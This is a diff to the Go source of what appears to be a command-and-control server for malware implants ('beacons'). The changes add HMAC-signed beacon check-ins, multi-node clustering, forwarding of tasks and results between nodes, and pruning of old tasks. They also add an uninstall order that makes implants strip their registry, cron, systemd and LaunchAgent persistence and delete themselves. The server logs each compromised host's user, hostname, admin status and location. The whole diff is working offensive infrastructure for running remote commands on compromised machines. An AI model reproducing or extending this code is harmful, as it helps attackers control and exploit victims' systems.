@@ -46,6 +46,14 @@ var (
 )
 
 func lookupGeoIP(ip string) (string, string) {
+	// Third-party GeoIP enrichment is opsec-sensitive and disabled by default.
+	settingsMutex.RLock()
+	enabled := GlobalSettings.GeoIPLookup
+	settingsMutex.RUnlock()
+	if !enabled {
+		return "", ""
+	}
+
 	parsedIP := net.ParseIP(ip)
 	if parsedIP == nil || parsedIP.IsLoopback() || parsedIP.IsPrivate() {
 		return "", ""
@@ -82,6 +90,10 @@ func lookupGeoIP(ip string) (string, string) {
 	}
 
 	geoCacheMu.Lock()
+	if len(geoCache) >= 8192 {
+		// Simple bound: drop everything when full. Entries re-populate lazily.
+		geoCache = make(map[string][2]string)
+	}
 	geoCache[ip] = [2]string{country, code}
 	geoCacheMu.Unlock()
 
@@ -201,6 +213,9 @@ func processCommand(clientID, command string) (string, interface{}, error) {
 					if err := db.Save(&client).Error; err != nil {
 						return "", nil, err
 					}
+					emitClusterEvent("beacon_config", map[string]interface{}{
+						"beacon_id": clientID, "sleep": client.Sleep, "jitter": client.Jitter,
+					}, client.HomeNodeID)
 					msg := fmt.Sprintf("BEACON_CONFIG_UPDATE: sleep=%d jitter=%d for %s", client.Sleep, client.Jitter, clientID)
 					go addLog("CONFIG", msg)
 					return "CONFIG_UPDATED", nil, nil
@@ -221,6 +236,10 @@ func processCommand(clientID, command string) (string, interface{}, error) {
 		if result.RowsAffected == 0 {
 			return "", nil, fmt.Errorf("client not found: %s", clientID)
 		}
+		var client Client
+		if err := db.First(&client, "id = ?", clientID).Error; err == nil {
+			emitClusterEvent("beacon_note", map[string]string{"beacon_id": clientID, "note": note}, client.HomeNodeID)
+		}
 		go addLog("C2", fmt.Sprintf("NOTE_SET: %s -> %s", clientID, note))
 		return "NOTE_SET", nil, nil
 	}
@@ -235,7 +254,9 @@ func processCommand(clientID, command string) (string, interface{}, error) {
 }
 
 func newTaskID() string {
-	return "T-" + strings.ReplaceAll(uuid.New().String(), "-", "")[:12]
+	// 32 hex chars: infeasible to brute-force, so results cannot be forged
+	// by guessing task IDs even before HMAC auth is considered.
+	return "T-" + strings.ReplaceAll(uuid.New().String(), "-", "")
 }
 
 func createPendingTask(clientID, command string) (*Task, error) {
@@ -243,16 +264,17 @@ func createPendingTask(clientID, command string) (*Task, error) {
 		return nil, fmt.Errorf("client id and command are required")
 	}
 	var client Client
-	if err := db.Select("id").First(&client, "id = ?", clientID).Error; err != nil {
+	if err := db.Select("id", "home_node_id").First(&client, "id = ?", clientID).Error; err != nil {
 		return nil, fmt.Errorf("client not found: %s", clientID)
 	}
 	for attempt := 0; attempt < 5; attempt++ {
 		task := &Task{
-			ID:        newTaskID(),
-			ClientID:  clientID,
-			Command:   command,
-			Status:    "pending",
-			CreatedAt: time.Now(),
+			ID:         newTaskID(),
+			ClientID:   clientID,
+			Command:    command,
+			Status:     "pending",
+			OriginNode: localNodeID(),
+			CreatedAt:  time.Now(),
 		}
 		if err := db.Create(task).Error; err != nil {
 			// Retry on possible primary key collision.
@@ -260,6 +282,11 @@ func createPendingTask(clientID, command string) (*Task, error) {
 				continue
 			}
 			return nil, err
+		}
+		// Cluster: when the beacon lives on another node, forward the task to
+		// its home node, which queues it for delivery at the next check-in.
+		if home := client.HomeNodeID; home != "" && home != localNodeID() {
+			emitClusterEvent("task_create", task, home)
 		}
 		return task, nil
 	}
@@ -288,12 +315,97 @@ func claimPendingTasks(clientID string) ([]Task, error) {
 	return claimed, err
 }
 
+// ── Task completion + waiter notification ─────────────────
+
+// taskWaiters lets sendTaskAndWait sleep on a channel instead of polling the
+// database every 500ms. Result ingestion calls notifyTaskWaiters.
+var (
+	taskWaitersMu sync.Mutex
+	taskWaiters   = make(map[string]chan *Task)
+)
+
+func registerTaskWaiter(taskID string) chan *Task {
+	ch := make(chan *Task, 4)
+	taskWaitersMu.Lock()
+	taskWaiters[taskID] = ch
+	taskWaitersMu.Unlock()
+	return ch
+}
+
+func removeTaskWaiter(taskID string) {
+	taskWaitersMu.Lock()
+	delete(taskWaiters, taskID)
+	taskWaitersMu.Unlock()
+}
+
+func notifyTaskWaiters(task *Task) {
+	taskWaitersMu.Lock()
+	ch, ok := taskWaiters[task.ID]
+	taskWaitersMu.Unlock()
+	if ok {
+		select {
+		case ch <- task:
+		default:
+		}
+	}
+}
+
+// maxTaskResultSize caps beacon result storage per task.
+const maxTaskResultSize = 32 << 20
+
+// completeTask stores a result for a running task, wakes any waiter and
+// propagates the result to the issuing cluster node when it is remote.
+func completeTask(taskID, beaconID, output string) bool {
+	var task Task
+	if err := db.First(&task, "id = ? AND client_id = ? AND status = ?", taskID, beaconID, "running").Error; err != nil {
+		return false
+	}
+	if len(output) > maxTaskResultSize {
+		output = output[:maxTaskResultSize]
+	}
+	task.Status = "completed"
+	task.Result = output
+	if err := db.Model(&Task{}).Where("id = ?", task.ID).Updates(map[string]interface{}{
+		"status": "completed",
+		"result": output,
+	}).Error; err != nil {
+		addLog("ERR", "TASK_RESULT_SAVE_FAILED: "+err.Error())
+		return false
+	}
+	task.Status = "completed"
+	task.Result = output
+	notifyTaskWaiters(&task)
+	emitClusterEvent("task_result", map[string]string{
+		"task_id": task.ID, "status": task.Status, "result": output,
+	}, task.OriginNode)
+	addLog("TASK", fmt.Sprintf("TASK_COMPLETED: %s on %s", task.Command, task.ClientID))
+	return true
+}
+
 var (
 	GlobalSettings Settings
 	settingsMutex  sync.RWMutex
 )
 
+// cluster hooks: wired up by cluster.go at startup. No-ops on a standalone node.
+var clusterEventHook func(eventType string, payload interface{}, targetNode string)
+
+// emitClusterEvent forwards an internal event to the cluster sync engine.
+// targetNode selects a single peer; empty means broadcast to all peers.
+func emitClusterEvent(eventType string, payload interface{}, targetNode string) {
+	if clusterEventHook != nil {
+		clusterEventHook(eventType, payload, targetNode)
+	}
+}
+
 func addLog(level, msg string) {
+	appendLog(level, msg, true)
+}
+
+// appendLog stores a log entry in the in-memory ring and broadcasts it. When
+// propagate is false (logs received from cluster peers), the event is not
+// re-emitted to the cluster, which would otherwise loop forever.
+func appendLog(level, msg string, propagate bool) {
 	wsMutex.Lock()
 
 	logEntry := map[string]string{
@@ -310,9 +422,9 @@ func addLog(level, msg string) {
 	}
 	wsMutex.Unlock()
 
-	select {
-	case wsBroadcast <- logStr:
-	default:
+	broadcastWS(logStr)
+	if propagate {
+		emitClusterEvent("log", logEntry, "")
 	}
 
 	settingsMutex.RLock()
@@ -334,8 +446,6 @@ func init() {
 
 	// Reset all listeners to stopped on startup
 	db.Model(&Listener{}).Where("status = ?", "running").Update("status", "stopped")
-
-	go handleMessages()
 
 	// Beacon offline detection goroutine
 	go func() {
@@ -378,10 +488,8 @@ func init() {
 						"ip":        c.IP,
 					}
 					eventJSON, _ := json.Marshal(event)
-					select {
-					case wsBroadcast <- string(eventJSON):
-					default:
-					}
+					broadcastWS(string(eventJSON))
+					emitClusterEvent("beacon_offline", map[string]string{"beacon_id": c.ID}, "")
 				}
 			}
 		}
@@ -403,23 +511,42 @@ func init() {
 		}
 	}()
 
+	// Old task pruning: results can be tens of MB each, so completed/failed
+	// tasks older than 90 days are removed to keep the database lean.
+	go func() {
+		for {
+			time.Sleep(6 * time.Hour)
+			cutoff := time.Now().Add(-90 * 24 * time.Hour)
+			result := db.Where("status IN ? AND created_at < ?", []string{"completed", "failed"}, cutoff).Delete(&Task{})
+			if result.Error == nil && result.RowsAffected > 0 {
+				addLog("SYS", fmt.Sprintf("TASK_PRUNED: removed %d tasks older than 90 days", result.RowsAffected))
+			}
+		}
+	}()
+
 	addLog("SYS", "PRTS TERMINAL INITIALIZED")
 	addLog("NET", "SCANNING FOR ACTIVE NODES...")
 	addLog("SEC", "ENCRYPTION LAYER STABLE")
 }
 
-func handleMessages() {
-	for {
-		msg := <-wsBroadcast
-		wsMutex.Lock()
-		for client := range wsClients {
-			err := client.WriteMessage(websocket.TextMessage, []byte(msg))
-			if err != nil {
-				client.Close()
-				delete(wsClients, client)
-			}
+// broadcastWS delivers a message to every connected dashboard. Each client
+// has its own writer goroutine, so this never performs network I/O inline
+// and a slow client is dropped instead of blocking everyone.
+func broadcastWS(msg string) {
+	wsMutex.Lock()
+	clients := make([]*wsClient, 0, len(wsClients))
+	for c := range wsClients {
+		clients = append(clients, c)
+	}
+	wsMutex.Unlock()
+
+	for _, c := range clients {
+		select {
+		case c.send <- msg:
+		default:
+			// Buffer full: the client cannot keep up. Drop it.
+			go c.shutdown()
 		}
-		wsMutex.Unlock()
 	}
 }
 
@@ -428,6 +555,13 @@ func handleMessages() {
 // ══════════════════════════════════════════════════════════
 
 func (l *Listener) Start() error {
+	alMutex.Lock()
+	defer alMutex.Unlock()
+
+	if _, running := activeListeners[l.ID]; running {
+		return fmt.Errorf("LISTENER_ALREADY_RUNNING")
+	}
+
 	switch l.Type {
 	case "reverse_http":
 		mux := http.NewServeMux()
@@ -473,28 +607,39 @@ func (l *Listener) Start() error {
 	}
 
 	l.Status = "running"
-	db.Save(l)
+	if err := db.Model(l).Updates(map[string]interface{}{"status": "running"}).Error; err != nil {
+		addLog("ERR", "LISTENER_STATUS_SAVE_FAILED: "+err.Error())
+	}
 
-	alMutex.Lock()
 	activeListeners[l.ID] = l
-	alMutex.Unlock()
 
 	return nil
 }
 
 func (l *Listener) Stop() error {
+	alMutex.Lock()
+	_, wasRunning := activeListeners[l.ID]
+	alMutex.Unlock()
+	if !wasRunning && l.server == nil && l.tcpListener == nil {
+		// Nothing running locally; just make sure the row is consistent.
+		db.Model(l).Update("status", "stopped")
+		return nil
+	}
+
 	if l.server != nil {
 		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 		defer cancel()
 		if err := l.server.Shutdown(ctx); err != nil {
 			return err
 		}
+		l.server = nil
 	}
 	if l.tcpListener != nil {
 		l.tcpListener.Close()
+		l.tcpListener = nil
 	}
 	l.Status = "stopped"
-	db.Save(l)
+	db.Model(l).Update("status", "stopped")
 
 	alMutex.Lock()
 	delete(activeListeners, l.ID)
@@ -565,7 +710,10 @@ func tcpReadMsg(conn net.Conn) ([]byte, error) {
 	return data, nil
 }
 
-// handleTCPBeaconConn handles a single TCP beacon connection
+// handleTCPBeaconConn handles a single TCP beacon connection.
+// Every message must carry a valid HMAC signature (TCPMsg.TS + TCPMsg.Sig).
+// The key is resolved during registration (beacon_id -> payload key) and then
+// reused for the lifetime of the connection.
 func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 	defer conn.Close()
 	remoteIP := extractIP(conn.RemoteAddr().String())
@@ -579,6 +727,7 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 	}
 
 	var beaconID string
+	var beaconKey string
 
 	for {
 		conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
@@ -611,6 +760,37 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 				tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"ERROR"`)})
 				continue
 			}
+
+			// Authentication: signed messages verify the HMAC and bind the
+			// payload key; unsigned messages are only accepted when legacy
+			// compatibility is enabled (pre-HMAC payloads).
+			if msg.Sig != "" || msg.TS != 0 {
+				if msg.Sig == "" {
+					// Timestamp without signature: malformed.
+					addLog("SEC", fmt.Sprintf("TCP_AUTH_REJECTED: %s from %s (MALFORMED)", regData.BeaconID, remoteIP))
+					tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
+					return
+				}
+				key, _, ok := credentialForBeacon(regData.BeaconID, tcpSignString("register", msg.TS, msg.Nonce, msg.Data), msg.Sig)
+				if !ok {
+					addLog("SEC", fmt.Sprintf("TCP_AUTH_REJECTED: %s from %s", regData.BeaconID, remoteIP))
+					tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
+					return
+				}
+				beaconKey = key
+			} else {
+				settingsMutex.RLock()
+				legacyOK := GlobalSettings.LegacyBeaconAuth
+				settingsMutex.RUnlock()
+				if !legacyOK {
+					addLog("SEC", fmt.Sprintf("TCP_AUTH_REJECTED: %s from %s (LEGACY_DISABLED)", regData.BeaconID, remoteIP))
+					tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
+					return
+				}
+				beaconKey = ""
+				addLog("SEC", fmt.Sprintf("LEGACY_TCP_BEACON: %s from %s (unsigned protocol)", regData.BeaconID, remoteIP))
+			}
+
 			tcpSleep := regData.Sleep
 			if tcpSleep <= 0 {
 				tcpSleep = 60
@@ -642,6 +822,7 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 					ProcessName: regData.ProcessName,
 					IsAdmin:     regData.IsAdmin,
 					ListenerID:  listenerID,
+					HomeNodeID:  localNodeID(),
 					FirstSeen:   time.Now(),
 					LastCheck:   time.Now(),
 					Sleep:       tcpSleep,
@@ -649,7 +830,9 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 					Country:     tcpCountry,
 					CountryCode: tcpCountryCode,
 				}
-				db.Create(&client)
+				if err := db.Create(&client).Error; err != nil {
+					addLog("ERR", "TCP_BEACON_CREATE_FAILED: "+err.Error())
+				}
 				addLog("C2", fmt.Sprintf("NEW_TCP_BEACON: %s@%s from %s [%s]", regData.Username, regData.Hostname, remoteIP, tcpCountryCode))
 
 				event := map[string]interface{}{
@@ -659,10 +842,8 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 					"is_admin": regData.IsAdmin,
 				}
 				eventJSON, _ := json.Marshal(event)
-				select {
-				case wsBroadcast <- string(eventJSON):
-				default:
-				}
+				broadcastWS(string(eventJSON))
+				emitClusterEvent("beacon_update", client, "")
 			} else {
 				// Existing beacon reconnect
 				client.Status = "online"
@@ -684,7 +865,10 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 				if regData.Jitter >= 0 {
 					client.Jitter = regData.Jitter
 				}
-				db.Save(&client)
+				if err := db.Save(&client).Error; err != nil {
+					addLog("ERR", "TCP_BEACON_UPDATE_FAILED: "+err.Error())
+				}
+				emitClusterEvent("beacon_update", client, "")
 			}
 			tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"OK"`)})
 
@@ -693,13 +877,23 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 				tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"NOT_REGISTERED"`)})
 				continue
 			}
+			// Signed connections verify every message; legacy connections
+			// (beaconKey == "") skip verification.
+			if beaconKey != "" && !authTCPMsg(beaconKey, &msg, msg.Data) {
+				addLog("SEC", fmt.Sprintf("TCP_AUTH_FAILED: %s from %s", beaconID, remoteIP))
+				tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
+				return
+			}
 
-			// Update last check
-			db.Model(&Client{}).Where("id = ?", beaconID).Updates(map[string]interface{}{
-				"last_check": time.Now(),
-				"status":     "online",
-				"ip":         remoteIP,
-			})
+			// Update last check. The conditional clause skips the write while
+			// the row is fresh, cutting database churn for frequent check-ins.
+			now := time.Now()
+			db.Model(&Client{}).Where("id = ? AND (last_check <= ? OR status != ?)", beaconID, now.Add(-5*time.Second), "online").
+				Updates(map[string]interface{}{
+					"last_check": now,
+					"status":     "online",
+					"ip":         remoteIP,
+				})
 
 			// Check for pending tasks
 			pendingTasks, err := claimPendingTasks(beaconID)
@@ -721,28 +915,46 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 			}
 
 		case "result":
+			if beaconID == "" {
+				continue
+			}
+			if beaconKey != "" && !authTCPMsg(beaconKey, &msg, msg.Data) {
+				addLog("SEC", fmt.Sprintf("TCP_AUTH_FAILED: %s from %s", beaconID, remoteIP))
+				tcpWriteMsg(conn, TCPMsg{Type: "terminate"})
+				return
+			}
 			var taskResult TaskResultData
 			if err := json.Unmarshal(msg.Data, &taskResult); err != nil || taskResult.TaskID == "" {
 				continue
 			}
-			var task Task
-			if err := db.First(&task, "id = ? AND client_id = ? AND status = ?", taskResult.TaskID, beaconID, "running").Error; err == nil {
-				task.Status = "completed"
-				task.Result = taskResult.Output
-				db.Save(&task)
-				addLog("TASK", fmt.Sprintf("TCP_TASK_COMPLETED: %s on %s", task.Command, task.ClientID))
-			}
+			completeTask(taskResult.TaskID, beaconID, taskResult.Output)
 			tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"OK"`)})
+
+		default:
+			// Unknown or unsigned control message types (e.g. terminate sent
+			// by us) are ignored on the inbound path.
 		}
 	}
 }
 
 // ── HTTP Beacon Check-in ─────────────────────────────────
+//
+// Current protocol: all beacon traffic is POST + HMAC authenticated:
+//   X-Beacon-ID / X-Beacon-Timestamp / X-Beacon-Nonce /
+//   X-Beacon-Sign = hex(HMAC(key, ts + "." + nonce + "." + body))
+//
+// Body semantics (matching the original wire format):
+//   - CheckInData JSON (beacon_id + hostname) -> registration
+//   - TaskResultData JSON (task_id)           -> task result
+//   - anything else                           -> poll; response is the claimed
+//     tasks JSON array, or "SLEEP <n> <jitter>" when idle.
+//
+// Legacy compatibility (Settings.LegacyBeaconAuth, default on): requests
+// without an X-Beacon-Sign header are served with the pre-HMAC protocol so
+// payloads generated before the upgrade keep working. Unsigned access is
+// inherently weaker — disable the setting once every payload is re-issued.
 
 func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
-	w.Header().Set("Access-Control-Allow-Origin", "*")
-	w.Header().Set("Access-Control-Allow-Headers", "*")
-
 	if r.Method == http.MethodOptions {
 		w.WriteHeader(http.StatusOK)
 		return
@@ -756,75 +968,117 @@ func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if r.Method == http.MethodPost {
-		r.Body = http.MaxBytesReader(w, r.Body, maxBeaconHTTPBody)
-		body, err := io.ReadAll(r.Body)
-		if err != nil {
-			w.WriteHeader(http.StatusBadRequest)
-			return
-		}
-		defer r.Body.Close()
-
-		var regData CheckInData
-		if err := json.Unmarshal(body, &regData); err == nil && regData.BeaconID != "" && regData.Hostname != "" {
-			handleBeaconRegistration(w, r, regData)
-			return
-		}
-
-		// Try to parse as task result
-		var result TaskResultData
-		if err := json.Unmarshal(body, &result); err == nil && result.TaskID != "" {
-			if strings.TrimSpace(result.BeaconID) == "" {
-				w.WriteHeader(http.StatusBadRequest)
-				return
-			}
-			var task Task
-			if err := db.First(&task, "id = ? AND client_id = ? AND status = ?", result.TaskID, result.BeaconID, "running").Error; err == nil {
-				task.Status = "completed"
-				task.Result = result.Output
-				db.Save(&task)
-				addLog("TASK", fmt.Sprintf("TASK_COMPLETED: %s on %s", task.Command, task.ClientID))
-			}
-		}
-		w.WriteHeader(http.StatusOK)
+	// Unauthenticated flood protection before touching the database.
+	if !allowCheckin(remoteIP) {
+		w.WriteHeader(http.StatusTooManyRequests)
 		return
 	}
 
-	// GET = check-in / poll for tasks
-	clientID := r.Header.Get("X-Beacon-ID")
-	if clientID == "" {
-		clientID = r.URL.Query().Get("id")
-	}
-	if clientID == "" {
-		clientID = "UNKNOWN"
+	if r.Header.Get("X-Beacon-Sign") == "" {
+		settingsMutex.RLock()
+		legacyOK := GlobalSettings.LegacyBeaconAuth
+		settingsMutex.RUnlock()
+		if !legacyOK {
+			addLog("SEC", fmt.Sprintf("BEACON_AUTH_REJECTED: %s from %s (MISSING_AUTH_HEADERS)", r.Header.Get("X-Beacon-ID"), remoteIP))
+			w.WriteHeader(http.StatusUnauthorized)
+			w.Write([]byte("AUTH_REQUIRED"))
+			return
+		}
+		handleLegacyBeaconCheckin(w, r, remoteIP)
+		return
 	}
 
-	beaconOS := parseBeaconOS(r)
+	if r.Method != http.MethodPost {
+		// Polling is POST-only in the HMAC protocol; GET cannot carry a body
+		// signature, so it no longer leaks task output.
+		w.Header().Set("Allow", "POST")
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		w.Write([]byte("POST_ONLY"))
+		return
+	}
 
+	r.Body = http.MaxBytesReader(w, r.Body, maxBeaconHTTPBody)
+	body, err := io.ReadAll(r.Body)
+	if err != nil {
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+	r.Body.Close()
+
+	authID, ok, reason := authBeaconRequest(r.Header.Get("X-Beacon-ID"), r.Header.Get("X-Beacon-Sign"), r.Header.Get("X-Beacon-Timestamp"), r.Header.Get("X-Beacon-Nonce"), body)
+	if !ok {
+		addLog("SEC", fmt.Sprintf("BEACON_AUTH_REJECTED: %s from %s (%s)", authID, remoteIP, reason))
+		w.WriteHeader(http.StatusUnauthorized)
+		w.Write([]byte("AUTH_REQUIRED"))
+		return
+	}
+
+	beaconDispatch(w, r, remoteIP, authID, body)
+}
+
+// beaconDispatch routes an authenticated request body to register / result /
+// poll handling. Shared by the HMAC and legacy protocol paths.
+func beaconDispatch(w http.ResponseWriter, r *http.Request, remoteIP, authID string, body []byte) {
+	// Registration?
+	var regData CheckInData
+	if err := json.Unmarshal(body, &regData); err == nil && regData.BeaconID != "" && regData.Hostname != "" {
+		if regData.BeaconID != authID {
+			// The signed identity must match the body identity.
+			w.WriteHeader(http.StatusUnauthorized)
+			w.Write([]byte("AUTH_REQUIRED"))
+			return
+		}
+		handleBeaconRegistration(w, r, regData)
+		return
+	}
+
+	// Task result?
+	var result TaskResultData
+	if err := json.Unmarshal(body, &result); err == nil && result.TaskID != "" {
+		if strings.TrimSpace(result.BeaconID) == "" || result.BeaconID != authID {
+			w.WriteHeader(http.StatusBadRequest)
+			return
+		}
+		completeTask(result.TaskID, result.BeaconID, result.Output)
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte("OK"))
+		return
+	}
+
+	// Check-in / poll for tasks
+	beaconPoll(w, authID, remoteIP, parseBeaconOS(r))
+}
+
+// beaconPoll updates the beacon row and answers with claimed tasks or a SLEEP
+// directive. Shared by both protocol paths.
+func beaconPoll(w http.ResponseWriter, authID, remoteIP, beaconOS string) {
 	var client Client
-	result := db.First(&client, "id = ?", clientID)
-
-	if result.Error == nil {
-		// Existing beacon check-in
-		client.LastCheck = time.Now()
-		client.Status = "online"
-		if client.IP != extractIP(r.RemoteAddr) {
-			client.IP = extractIP(r.RemoteAddr)
+	if err := db.First(&client, "id = ?", authID).Error; err == nil {
+		// Existing beacon check-in. Conditional update skips database churn
+		// while the row is fresh (offline detector thresholds are >= 90s).
+		now := time.Now()
+		ip := remoteIP
+		if client.IP == ip && client.Status == "online" {
+			db.Model(&Client{}).Where("id = ? AND last_check <= ?", authID, now.Add(-5*time.Second)).
+				Update("last_check", now)
+		} else {
+			updates := map[string]interface{}{"last_check": now, "status": "online", "ip": ip}
+			if beaconOS != "Unknown" && beaconOS != "" {
+				updates["os"] = beaconOS
+			}
+			db.Model(&Client{}).Where("id = ?", authID).Updates(updates)
 		}
-		if beaconOS != "Unknown" && beaconOS != "" {
-			client.OS = beaconOS
-		}
-		db.Save(&client)
-	} else if clientID != "UNKNOWN" {
-		// New beacon registration (basic - without JSON body)
-		basicIP := extractIP(r.RemoteAddr)
-		basicCountry, basicCountryCode := lookupGeoIP(basicIP)
+	} else {
+		// First poll after key binding: create a minimal record; registration
+		// with full host info usually arrived first.
+		basicCountry, basicCountryCode := lookupGeoIP(remoteIP)
 		client = Client{
-			ID:          clientID,
-			Name:        beaconNodeName(clientID),
-			IP:          basicIP,
+			ID:          authID,
+			Name:        beaconNodeName(authID),
+			IP:          remoteIP,
 			Status:      "online",
 			OS:          beaconOS,
+			HomeNodeID:  localNodeID(),
 			FirstSeen:   time.Now(),
 			LastCheck:   time.Now(),
 			Sleep:       60,
@@ -832,25 +1086,26 @@ func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
 			Country:     basicCountry,
 			CountryCode: basicCountryCode,
 		}
-		db.Create(&client)
-		addLog("C2", fmt.Sprintf("NEW_BEACON_REGISTERED: %s from %s [%s]", clientID, basicIP, basicCountryCode))
+		if err := db.Create(&client).Error; err != nil {
+			addLog("ERR", "BEACON_CREATE_FAILED: "+err.Error())
+			w.WriteHeader(http.StatusInternalServerError)
+			return
+		}
+		addLog("C2", fmt.Sprintf("NEW_BEACON_REGISTERED: %s from %s [%s]", authID, remoteIP, basicCountryCode))
 
-		// Broadcast new beacon event
 		event := map[string]interface{}{
 			"type":      "new_beacon",
-			"beacon_id": clientID,
-			"ip":        extractIP(r.RemoteAddr),
+			"beacon_id": authID,
+			"ip":        remoteIP,
 			"os":        beaconOS,
 		}
 		eventJSON, _ := json.Marshal(event)
-		select {
-		case wsBroadcast <- string(eventJSON):
-		default:
-		}
+		broadcastWS(string(eventJSON))
+		emitClusterEvent("beacon_update", client, "")
 	}
 
 	// Check for pending tasks
-	pendingTasks, err := claimPendingTasks(clientID)
+	pendingTasks, err := claimPendingTasks(authID)
 	if err != nil {
 		w.WriteHeader(http.StatusInternalServerError)
 		return
@@ -867,7 +1122,61 @@ func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte(fmt.Sprintf("SLEEP %d %d", client.Sleep, client.Jitter)))
 }
 
-// handleBeaconRegistration processes the enhanced registration JSON from beacon
+// handleLegacyBeaconCheckin serves the pre-HMAC wire protocol so payloads
+// generated before the upgrade keep working:
+//
+//	POST: registration (CheckInData) or task result (TaskResultData)
+//	GET:  poll via X-Beacon-ID header / ?id= query
+func handleLegacyBeaconCheckin(w http.ResponseWriter, r *http.Request, remoteIP string) {
+	if r.Method == http.MethodPost {
+		r.Body = http.MaxBytesReader(w, r.Body, maxBeaconHTTPBody)
+		body, err := io.ReadAll(r.Body)
+		if err != nil {
+			w.WriteHeader(http.StatusBadRequest)
+			return
+		}
+		r.Body.Close()
+
+		var regData CheckInData
+		if err := json.Unmarshal(body, &regData); err == nil && regData.BeaconID != "" && regData.Hostname != "" {
+			addLog("SEC", "LEGACY_PROTOCOL: unsigned registration for "+regData.BeaconID)
+			handleBeaconRegistration(w, r, regData)
+			return
+		}
+
+		var result TaskResultData
+		if err := json.Unmarshal(body, &result); err == nil && result.TaskID != "" {
+			if strings.TrimSpace(result.BeaconID) == "" {
+				w.WriteHeader(http.StatusBadRequest)
+				return
+			}
+			completeTask(result.TaskID, result.BeaconID, result.Output)
+		}
+		w.WriteHeader(http.StatusOK)
+		w.Write([]byte("OK"))
+		return
+	}
+
+	if r.Method != http.MethodGet {
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		return
+	}
+
+	clientID := r.Header.Get("X-Beacon-ID")
+	if clientID == "" {
+		clientID = r.URL.Query().Get("id")
+	}
+	if clientID == "" {
+		w.WriteHeader(http.StatusBadRequest)
+		return
+	}
+
+	beaconPoll(w, clientID, remoteIP, parseBeaconOS(r))
+}
+
+// handleBeaconRegistration processes the enhanced registration JSON from a
+// beacon. Callers must have authenticated the request (HMAC signature, or the
+// legacy protocol when Settings.LegacyBeaconAuth is enabled).
 func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data CheckInData) {
 	var client Client
 	result := db.First(&client, "id = ?", data.BeaconID)
@@ -896,7 +1205,13 @@ func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data Check
 			client.Jitter = data.Jitter
 		}
 		client.IP = extractIP(r.RemoteAddr)
-		db.Save(&client)
+		if client.HomeNodeID == "" {
+			client.HomeNodeID = localNodeID()
+		}
+		if err := db.Save(&client).Error; err != nil {
+			addLog("ERR", "BEACON_UPDATE_FAILED: "+err.Error())
+		}
+		emitClusterEvent("beacon_update", client, "")
 	} else {
 		// New registration
 		name := data.Hostname
@@ -927,6 +1242,7 @@ func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data Check
 			PID:         data.PID,
 			ProcessName: data.ProcessName,
 			IsAdmin:     data.IsAdmin,
+			HomeNodeID:  localNodeID(),
 			FirstSeen:   time.Now(),
 			LastCheck:   time.Now(),
 			Sleep:       beaconSleep,
@@ -934,7 +1250,11 @@ func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data Check
 			Country:     country,
 			CountryCode: countryCode,
 		}
-		db.Create(&client)
+		if err := db.Create(&client).Error; err != nil {
+			addLog("ERR", "BEACON_CREATE_FAILED: "+err.Error())
+			w.WriteHeader(http.StatusInternalServerError)
+			return
+		}
 		addLog("C2", fmt.Sprintf("NEW_BEACON: %s@%s (%s) PID:%d [%s] [%s]",
 			data.Username, data.Hostname, clientIP, data.PID, data.OS, countryCode))
 
@@ -949,10 +1269,8 @@ func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data Check
 			"is_admin":  data.IsAdmin,
 		}
 		eventJSON, _ := json.Marshal(event)
-		select {
-		case wsBroadcast <- string(eventJSON):
-		default:
-		}
+		broadcastWS(string(eventJSON))
+		emitClusterEvent("beacon_update", client, "")
 	}
 
 	w.WriteHeader(http.StatusOK)
@@ -989,6 +1307,29 @@ func handleKillBeacon(c *gin.Context) {
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "KILL_SENT"})
 }
 
+// handleUninstallBeacon disconnects the beacon and removes the payload from
+// the target: the implant removes its persistence artifacts (registry run
+// key / scheduled task / startup copy / cron / systemd / LaunchAgent),
+// deletes its own binary and exits. Payloads built before this feature only
+// support the plain kill (__EXIT__).
+func handleUninstallBeacon(c *gin.Context) {
+	id := c.Param("id")
+	var client Client
+	if err := db.First(&client, "id = ?", id).Error; err != nil {
+		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
+		return
+	}
+
+	if _, err := createPendingTask(id, "__UNINSTALL__"); err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "FAILED_TO_QUEUE_UNINSTALL"})
+		return
+	}
+
+	db.Model(&Client{}).Where("id = ?", id).Update("status", "offline")
+	addLog("C2", fmt.Sprintf("UNINSTALL_SENT: %s (%s@%s) - persistence cleanup + self-delete ordered", id, client.Username, client.Hostname))
+	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "UNINSTALL_SENT"})
+}
+
 func handleQuickCommand(c *gin.Context) {
 	var req struct {
